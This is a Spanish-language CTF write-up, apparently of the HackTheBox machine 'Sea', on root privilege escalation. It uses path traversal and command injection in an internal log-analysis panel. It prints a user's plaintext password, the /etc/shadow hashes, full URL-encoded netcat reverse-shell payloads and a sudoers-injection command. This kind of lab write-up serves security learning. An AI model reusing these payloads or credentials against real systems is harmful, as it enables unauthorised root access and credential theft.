### Local enumeration

-  User : Amay Password: mychemicalromance

### Atack vector

-  sudo -l 
-  PATH TRAVERSAL -->on localhost:8080 


Si hacemos un sudo -l vemos que amay tiene permisos de sudo en todo 

![[Pasted image 20241122141551.png]]


---



Le quito los permisos a amay con sudo visudo y continuamos con el escalado.

sudo -l no nos permite sudo en la maquina como user amay:
```bash
amay@sea:~$ sudo -l 
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea
```

netstat -tulnp nos muestra el puerto 8080 donde hay un servidor web:
```bash
amay@sea:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33749         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      4624/ssh            
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      4914/ssh            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

amay@sea:~$ curl -I http://localhost:8080
HTTP/1.0 401 Unauthorized
Host: localhost:8080
Date: Fri, 22 Nov 2024 13:23:59 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
WWW-Authenticate: Basic realm="Restricted Area"
Content-type: text/html; charset=UTF-8


amay@sea:~$ curl -u "amay:mychemicalromance" -I http://localhost:8080
HTTP/1.1 200 OK
Host: localhost:8080
Date: Fri, 22 Nov 2024 13:24:40 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
Content-type: text/html; charset=UTF-8
```

Vamos a crear un puente a nuestro host que mapee el puerto 8080 con la de la maquina

```bash
 ssh -L 8080:localhost:8080 amay@sea.htb -i seakey
```

La maquina nos muestra un panel de control:

![[Pasted image 20241122142646.png]]


  # PATH TRAVERSAL 

Cuando le damos a analyze el servidor manda la siguiente peticion POST
![[Pasted image 20241122143542.png]]

Podemos modificar el POST para que apunte a por ejemplo /etc/shadow

![[Pasted image 20241122143711.png]]


## /etc/shadow

![[Pasted image 20241122143748.png]]

Podemos ver el /etc/shadow pero el sistema estara usando cat por detras, podemos injectar comandos?

## RCE
![[Pasted image 20241122145305.png]]

Modificando la inejccion descubro que el caracter ";" para finalizar el comando no funciona pero si el "+# " para terminar donde el "+" se url-encodea como un espacio en la peticion 

La peticion post final se ve asi 
```http
POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8081/
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=/etc/shadow%26%26id+#&analyze_log=
```
Donde:
- && --> se URL-encodea como %26%26

**Response:**
```http
root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0:19775:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19774:0:99999:7:::
sshd:*:19774:0:99999:7:::
systemd-coredump:!!:19774::::::
amay:$6$S1AGe5ex2k4D5MKa$gTclSeJwvND3FINpZaK0zfUqk6T9IkhlxCn17fNWLx56u.zP/f/4e5YrJRPsM3TRuuKXQDfYL44RyPzduexsm.:19775:0:99999:7:::
lxd:!:19774::::::
geo:$6$5mAIqOze4GJ4s9Zu$P3IgUSHlcCkKpDJ0862IgP5aqaNilEUZDGIm16FiWdxh1A5dfKjmwhMgp3xctHiHZVWGtmKY25cCrILanDPaG.:19934:0:99999:7:::
_laurel:!:19936::::::
uid=0(root) gid=0(root) groups=0(root)
<p class='error'>Suspicious traffic patterns detected in /etc/shadow&&id #:</p><pre>uid=0(root) gid=0(root) groups=0(root)</pre>        </div>

    </div>
</body>
</html>

```

Podemos injectar comandos entonces, podemos enviar una reverse-shell o darle permisos de sudo al user amay

Voy a usar una reverse shell con netcat que saque del siguiente documento
(Rev-shells](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)

En la máquina del atacante:

|   |   |
|---|---|
|1|`nc` `-lvp 1234`|

En la máquina de la víctima:

|   |   |
|---|---|
|1|`nc` `-e` `/bin/sh` `10.0.0.1 1234`|

En el caso de **Netcat** podemos encontrarnos el caso de que este instalada una versión de **Netcat** que no soporte la opción _-e_, entonces usaremos el siguiente comando en vez del antes indicado:

|     |                                                                                                           |
| --- | --------------------------------------------------------------------------------------------------------- |
| 1   | `rm` `/tmp/f``;``mkfifo` `/tmp/f``;``cat` `/tmp/f``\|``/bin/sh` `-i 2>&1\|``nc` `10.0.0.1 1234 >``/tmp/f` |
Que url-encodeado se veria asi 

```http
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.184%204440%20%3E%2Ftmp%2Ff
```

# God access
La peticion final se ve asi 


```http
POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8081/
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
log_file=/etc/passwd+%26%26rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.184%204440%20%3E%2Ftmp%2Ff%3Bsleep+60+#&analyze_log=
```
![[Pasted image 20241122153243.png]]

Otra opcion es poner a amay en el sudoers file
```bash
/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#
```
Luego **sudo su** desde el usuario amay y listo.
